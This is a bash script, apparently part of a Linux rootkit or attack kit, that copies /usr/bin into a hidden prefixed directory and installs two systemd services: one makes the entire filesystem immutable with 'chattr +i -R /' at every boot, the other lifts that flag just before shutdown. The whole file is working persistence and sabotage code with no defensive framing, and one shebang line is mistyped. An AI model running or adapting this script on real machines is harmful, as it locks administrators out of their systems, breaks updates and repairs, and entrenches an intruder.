#!/bin/bash

magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
thisDirPath=$(pwd)
thisDir=${PWD##*/}

# Copy all commands in /usr/bin to trove dir
trovePath="$thisDirPath/$magicPrefix""trove"
mkdir "$trovePath"
cp -r /usr/bin/* "$trovePath"
$trovePath"/echo" "Trove."

# Immute script:
touch immute.sh
chmod +x immute.sh
echo "#!/bin/bash" >> immute.sh
echo "$trovePath/chattr +i -R /" >> immute.sh
immutePath="$thisDirPath/immute.sh"
immuteServicePath="/etc/systemd/system/""$magicPrefix""immute.service"
touch $immuteServicePath
echo "[Unit]" >> "$immuteServicePath"
echo "Description=Joe Mamma" >> "$immuteServicePath"
echo "After=multi-user.target" >> "$immuteServicePath"
echo "" >> "$immuteServicePath"
echo "[Service]" >> "$immuteServicePath"
echo "Type=simple" >> "$immuteServicePath"
echo "RemainAfterExit=yes" >> "$immuteServicePath"
echo "ExecStart=$immutePath" >> "$immuteServicePath"
echo "TimeoutStartSec=0" >> "$immuteServicePath"
echo "" >> "$immuteServicePath"
echo "[Install]" >> "$immuteServicePath"
echo "WantedBy=default.target" >> "$immuteServicePath" 
systemctl daemon-reload
systemctl enable "$immuteServicePath"
echo "Immute."

# Shutdown script:
touch shutdown.sh
chmod +x shutdown.sh
echo "#!/+bin/bash" >> shutdown.sh
echo "$trovePath/chattr -i -R /" >> shutdown.sh
shutdownPath="$thisDirPath/shutdown.sh"
shutdownServicePath="/etc/systemd/system/""$magicPrefix""shutdown.service"
touch $shutdownServicePath
echo "[Unit]" >> "$shutdownServicePath"
echo "Description=Joe Mamma" >> "$shutdownServicePath"
echo "DefaultDependencies=no" >> "$shutdownServicePath"
echo "Before=shutdown.target" >> "$shutdownServicePath"
echo "" >> "$shutdownServicePath"
echo "[Service]" >> "$shutdownServicePath"
echo "Type=oneshot" >> "$shutdownServicePath"
echo "ExecStart=$shutdownPath" >> "$shutdownServicePath"
echo "TimeoutStartSec=0" >> "$shutdownServicePath"
echo "" >> "$shutdownServicePath"
echo "[Install]" >> "$shutdownServicePath"
echo "WantedBy=shutdown.target" >> "$shutdownServicePath" 
systemctl daemon-reload
systemctl enable "$shutdownServicePath"

echo "Setup."